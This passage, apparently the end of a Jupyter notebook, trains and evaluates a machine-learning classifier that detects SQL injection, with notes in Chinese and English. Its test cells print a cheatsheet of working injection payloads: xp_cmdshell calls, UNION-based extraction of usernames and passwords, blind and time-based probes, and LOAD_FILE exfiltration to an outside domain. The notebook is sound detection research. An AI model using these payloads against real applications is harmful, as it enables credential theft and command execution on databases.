    "y_pred[y_probs<thres] = 'legit'\n",
    "y_pred[y_probs>=thres] = 'malicious'\n",
    "cm = confusion_matrix(y_test, y_pred, labels)\n",
    "plot_cm(cm, labels)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "由于测试数据集的关系，这个分类器更倾向于报告分类结果为：恶意，主要原因是数据集中恶意样本占比非常高"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 137,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "<zip at 0x11b682208>"
      ]
     },
     "execution_count": 137,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# We can also look at what features the learning algorithm thought were the most important\n",
    "importances = zip(['length', 'entropy', 'legit_g', 'malicious_g'], clf.feature_importances_)\n",
    "importances\n",
    "\n",
    "# From the list below we see our feature importance scores. There's a lot of feature selection,\n",
    "# sensitivity study, etc stuff that you could do if you wanted at this point."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 138,
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style>\n",
       "    .dataframe thead tr:only-child th {\n",
       "        text-align: right;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: left;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>raw_sql</th>\n",
       "      <th>type</th>\n",
       "      <th>parsed_sql</th>\n",
       "      <th>sequences</th>\n",
       "      <th>pred</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>347</th>\n",
       "      <td>GoogleGitSign in eclipse / datatools/org.eclip...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[Identifier, Keyword, Operation, Operator, Ope...</td>\n",
       "      <td>[('Identifier',), ('Keyword',), ('Operation',)...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>117</th>\n",
       "      <td>CREATE TABLE sylph.users ( id SERIAL PRIMARY K...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DDL, Keyword, Identifier, Punctuation, Identi...</td>\n",
       "      <td>[('DDL',), ('Keyword',), ('Identifier',), ('Pu...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>610</th>\n",
       "      <td>SELECT dept, number, SUBSTR(title, 1, 12) AS s...</td>\n",
       "      <td>legit</td>\n",
       "      <td>[DML, Identifier, Punctuation, Builtin, Punctu...</td>\n",
       "      <td>[('DML',), ('Identifier',), ('Punctuation',), ...</td>\n",
       "      <td>malicious</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "                                               raw_sql   type  \\\n",
       "347  GoogleGitSign in eclipse / datatools/org.eclip...  legit   \n",
       "117  CREATE TABLE sylph.users ( id SERIAL PRIMARY K...  legit   \n",
       "610  SELECT dept, number, SUBSTR(title, 1, 12) AS s...  legit   \n",
       "\n",
       "                                            parsed_sql  \\\n",
       "347  [Identifier, Keyword, Operation, Operator, Ope...   \n",
       "117  [DDL, Keyword, Identifier, Punctuation, Identi...   \n",
       "610  [DML, Identifier, Punctuation, Builtin, Punctu...   \n",
       "\n",
       "                                             sequences       pred  \n",
       "347  [('Identifier',), ('Keyword',), ('Operation',)...  malicious  \n",
       "117  [('DDL',), ('Keyword',), ('Identifier',), ('Pu...  malicious  \n",
       "610  [('DML',), ('Identifier',), ('Punctuation',), ...  malicious  "
      ]
     },
     "execution_count": 138,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "# Now were going to just do some post analysis on how the ML algorithm performed.\n",
    "# Lets look at the legit samples that were misclassified as malicious\n",
    "test_set = dataframe.loc[index_test]\n",
    "test_set['pred'] = y_pred\n",
    "misclassified = test_set[(test_set['type']=='legit') & (test_set['pred']=='malicious')]\n",
    "misclassified.head()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 139,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": [
    "# Discussion for how to use the resulting models.\n",
    "# Typically Machine Learning comes in two phases\n",
    "#    - Training of the Model\n",
    "#    - Evaluation of new observations against the Model\n",
    "# This notebook is about exploration of the data and training the model.\n",
    "# After you have a model that you are satisfied with, just 'pickle' it\n",
    "# at the end of the your training script and then in a separate\n",
    "# evaluation script 'unpickle' it and evaluate/score new observations\n",
    "# coming in (through a file, or ZeroMQ, or whatever...)\n",
    "#\n",
    "# In this case we'd have to pickle the RandomForest classifier.\n",
    "# See 'test_it' below for how to use them in evaluation mode.\n",
    "\n",
    "\n",
    "# test_it shows how to do evaluation, also fun for manual testing below :)\n",
    "def test_it(sql):\n",
    "    parsed_sql = parse_it(sql)\n",
    "    ngram_list = ngrams(parsed_sql, 3)\n",
    "    malicious_g = g_aggregate(ngram_list, 'malicious_g')\n",
    "    legit_g = g_aggregate(ngram_list, 'legit_g')\n",
    "    _X = [len(parsed_sql), entropy(sql), legit_g, malicious_g]\n",
    "    #print(np.asarray(_X).reshape(1, -1))\n",
    "    print('%-40s: %s' % (sql, clf.predict(np.asarray(_X).reshape(1, -1))[0]))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 140,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "select * from employees                 : legit\n",
      "'; exec master..xp_cmdshell             : malicious\n",
      "'any 'x'='x'                            : malicious\n",
      "from dorseys mom xp_cmdshell biache     : malicious\n",
      "select * from your_mom                  : legit\n"
     ]
    }
   ],
   "source": [
    "test_it('select * from employees')\n",
    "test_it(\"'; exec master..xp_cmdshell\")\n",
    "test_it(\"'any 'x'='x'\")\n",
    "test_it('from dorseys mom xp_cmdshell biache')\n",
    "test_it('select * from your_mom')"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 141,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "hello                                   : legit\n",
      "233                                     : malicious\n",
      "3'                                      : malicious\n",
      "3 order by 1/*                          : malicious\n",
      "3 order by 2/*                          : malicious\n",
      "3 order by 3/*                          : malicious\n",
      "3 order by 4/*                          : malicious\n",
      "3 order by 5/*                          : malicious\n",
      "3 union all select 1,2,3,4/*            : malicious\n",
      "3 union all select 1,2,3,4--            : malicious\n",
      "3 union all select 1,2,@@version,4/*    : malicious\n",
      "3 union all select 1,2,password,4,5 from admin/*: malicious\n",
      "3 union all select 1,2,concat(username,0x3a,password),4,5 from admin/*: malicious\n",
      "3 and 1=1                               : malicious\n",
      "3 and 1=2                               : malicious\n",
      "3 and substring(@@version,1,1)=4        : malicious\n",
      "3 and substsubstringring(@@versversionion,1,1)=4: malicious\n",
      "3 and substring(@@version,1,1)=5        : malicious\n",
      "3 and (select 1)=1                      : malicious\n",
      "3 and (select 1 from mysql.user limit 0,1)=1: malicious\n",
      "3 and (select 1 from users limit 0,1)=1 : malicious\n",
      "3 and (select substring(concat(1,password),1,1) from users limit 0,1)=1: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>80: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),2,1))>99: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>104: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>107: malicious\n",
      "3 and ascii(substring((SELECT concat(username,0x3a,password) from users limit 0,1),1,1))>105: malicious\n",
      "' and (select substr(group_concat(pass),1,1) from users)='a: malicious\n",
      "-99 OR IF((ASCII(MID((select id from tb_users),1,1)) = 100),SLEEP(14),1) = 0 LIMIT 1--: malicious\n",
      "-99 OR (SELECT LOAD_FILE(concat('\\\\\\\\',(select id from tb_users), 'sec.cuc.edu.cn\\\\'))): legit\n",
      "-99 OR (SELECT id from tb_users INTO OUTFILE '\\\\\\\\tmp\\\\share\\\\output.txt'): legit\n",
      "1 OR 2-1=0                              : malicious\n",
      "areyouok                                : legit\n",
      "mamashuotebiechangdeparamshouldbemaliciousisnotalwaysright: legit\n",
      "mamashuo'tebiechangdeparamshouldbemaliciousisnotalwaysright: malicious\n",
      "1 and (SELECT count(*) FROM sysusers AS sys1, sysusers as sys2, sysusers as sys3, sysusers AS sys4, sysusers AS sys5, sysusers AS sys6, sysusers AS sys7, sysusers AS sys8)>1 and 75>(select top 1 ascii(substring(name,1,1)) from sysusers) : malicious\n"
     ]
    }
   ],
   "source": [
    "# 使用非./data目录中的样本数据测试\n",
    "with open('cheatsheet.txt') as cheatsheets:\n",
    "    for case in cheatsheets:\n",
    "        test_it(case.strip('\\n'))"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Conclusions:\n",
    "The combination of IPython, Pandas and Scikit Learn let us pull in some junky SQL data, clean it up, plot it, understand it and slap it with some machine learning!\n",
    "\n",
    "Clearly a lot more formality could be used, plotting learning curves, adjusting for overfitting, feature selection, on and on... there are some really great machine learning resources that cover this deeper material. In particular we highly recommend the work and presentations of Olivier Grisel at INRIA Saclay. http://ogrisel.com/\n",
    "\n",
    " - W. G.J. Halfond, J. Viegas, and A. Orso, \"A Classiﬁcation of SQL Injection Attacks and Countermeasure\",[http://www-bcf.usc.edu/~halfond/papers/halfond06issse.pdf]\n",
    " - A. K. Baranwa1, \"Approaches to detect SQL injection and XSS in web applications,\" 2012. [http://blogs.ubc.ca/computersecurity/files/2012/04/ABaranwal_ApproachesToDetectSQLinjection_XSSinWebApplication.pdf]"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {
    "collapsed": true
   },
   "source": [
    "### Recommended Readings\n",
    "\n",
    "* [Time-Based Blind SQL Injection using Heavy Queries | A practical approach for MS SQL Server, MS Access, Oracle and MySQL databases and Marathon Tool](https://www.defcon.org/images/defcon-16/dc16-presentations/alonso-parada/defcon-16-alonso-parada-wp.pdf)\n",
    "* [free online reference about SQL injection attacks](http://www.sqlinjection.net/)\n",
    "* [SQL Injection Wiki | grouped by DBs](http://www.sqlinjectionwiki.com/)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### 后记\n",
    "\n",
    "* 上述机器学习方法建立的分类器模型，如果需要获得良好的分类性能，数据质量和标记质量至关重要！其次是特征工程的作用，至关重要！\n",
    "* 由于每次训练过程是随机划分训练数据集和测试数据集，所以上述notebook脚本多次重复运行得到的分类器的分类性能会有细微差异。"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {
    "collapsed": true
   },
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.6.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 1
}
